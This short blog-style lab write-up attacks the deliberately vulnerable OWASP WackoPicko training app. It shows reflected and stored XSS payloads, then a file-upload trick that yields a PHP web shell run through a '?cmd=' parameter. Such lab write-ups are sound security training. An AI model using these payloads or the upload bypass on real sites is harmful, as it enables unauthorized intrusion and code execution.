+++
title = "OWASP Broken Web Apps WackoPicko"
slug = "owasp-broken-web-apps-wackopicko"
default_language = "en"
[taxonomies]
categories=["vulnerable-web-app"]
tags=["web", "owasp"]
+++

Right off the bat, try hitting the search box with a simple XSS payload:

```javascript
search.php?query=<script>lt;script<script>gt;alert(1)<%2Fscript>&x=24&y=12
```

#/guestbook.php

Placing this:

```html
<script>confirm(1)</script>
<img src=x onerror='confirm(2)' />
```

into a comment body yields stored XSS

Next I made an account and started uploading stuff, turns out php files are uploadable and executable:

1. Make the file's name be: whatever.php
2. Make its extension: .jpg
3. Upload
4. Open the broken image on the page you're redirected to and open its URL in a new tab, remove the 550 from the URL
5. ?cmd=ls -latr



